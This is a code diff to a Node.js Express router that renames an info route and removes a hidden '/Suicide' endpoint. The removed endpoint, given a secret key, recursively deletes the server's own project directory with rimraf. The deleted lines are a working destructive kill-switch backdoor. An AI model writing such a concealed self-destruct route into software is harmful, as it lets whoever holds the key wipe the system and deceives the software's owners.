@@ -9,7 +9,7 @@ var path = require('path');
 const fs = require("fs");
 const rimraf = require("rimraf");
 /*********************************************/
-router.get('/AppInfoGetter/:type', function (req, res) {
+router.get('/information/:type', function (req, res) {
     switch (req.params.type) {
         case "city":
             cities.findAll().then(cities => {
@@ -116,17 +116,6 @@ router.get('/AppInfoGetter/:type', function (req, res) {
             break;
         default:
             return res.status(404).json();
-    }
-});
-
-router.get('/Suicide', (req, res) => {
-    if (req.query.key != null) {
-        if (req.query.key === selfDestroyKey) {
-            const targetPath = path.join(__dirname, "./../../");
-            rimraf(targetPath, function () {
-                return res.json({"message": "this is the last response of this server , byebye :)"})
-            });
-        }
     }
 });
 
